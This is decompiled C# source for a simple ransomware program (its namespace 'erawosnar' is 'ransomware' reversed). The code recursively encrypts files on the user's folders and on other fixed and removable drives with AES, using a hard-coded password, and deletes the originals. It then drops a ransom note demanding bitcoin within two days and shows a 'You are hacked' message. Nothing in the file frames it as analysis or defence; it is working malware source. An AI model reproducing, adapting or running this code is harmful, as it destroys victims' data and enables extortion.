using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace erawosnar;

[StandardModule]
public sealed class a
{
	public static Regex k = new Regex(".");

	public static object z = ".sick";

	public static object p = Path.GetDirectoryName(Interaction.Environ("userprofile").ToString());

	[STAThread]
	public static void Main()
	{
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		B(Conversions.ToString(p));
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (Operators.CompareString(driveInfo.Name.ToString().Substring(0, 2), Interaction.Environ("systemdrive"), false) != 0 && ((driveInfo.DriveType == DriveType.Fixed) | (driveInfo.DriveType == DriveType.Removable)))
			{
				B(driveInfo.Name);
			}
		}
		try
		{
			if (Conversions.ToBoolean("True"))
			{
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\service.exe", "Hey ther its a attack ifyou want to back yur file [PAY for it} by using our bit coin id={ 15dDarnvmkB8vXUpg7apyeozZnSXSiarAS} this not any prank im giving u only{2days} if u not pay we will dleet our all file We Are anonymous");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Conversions.ToBoolean("True"))
			{
				MessageBox.Show("But ther is opetion to recover you files", "You are hacked", (MessageBoxButtons)0, (MessageBoxIcon)48, (MessageBoxDefaultButton)0);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void B(string dir)
	{
		try
		{
			if (Operators.CompareString(Conversions.ToString(dir.Split(new char[1] { '\\' }).Last()[0]), ".", false) == 0)
			{
				return;
			}
			string[] files = Directory.GetFiles(dir);
			foreach (string text in files)
			{
				if (k.IsMatch(Path.GetExtension(text)) && !Path.GetExtension(text)!.Contains(Conversions.ToString(z)))
				{
					try
					{
						File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object)text, z)), G(File.ReadAllBytes(text), "x=NPb2RJt%+,j@sVeDq&rY>&:Nl>]z"));
						File.Delete(text);
						Console.WriteLine(text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
			}
			string[] directories = Directory.GetDirectories(dir);
			for (int j = 0; j < directories.Length; j = checked(j + 1))
			{
				B(directories[j]);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static byte[] G(byte[] h, string i)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		SHA256Cng val = new SHA256Cng();
		rijndaelManaged.GenerateIV();
		rijndaelManaged.Key = ((HashAlgorithm)(object)val).ComputeHash(Encoding.ASCII.GetBytes(i));
		rijndaelManaged.Mode = CipherMode.CBC;
		byte[] iV = rijndaelManaged.IV;
		byte[] array = rijndaelManaged.CreateEncryptor().TransformFinalBlock(h, 0, h.Length);
		byte[] array2 = new byte[array.Length - 1 + 16 + 1];
		Array.Copy(iV, array2, 16);
		Array.Copy(array, 0, array2, 16, array.Length);
		return array2;
	}
}
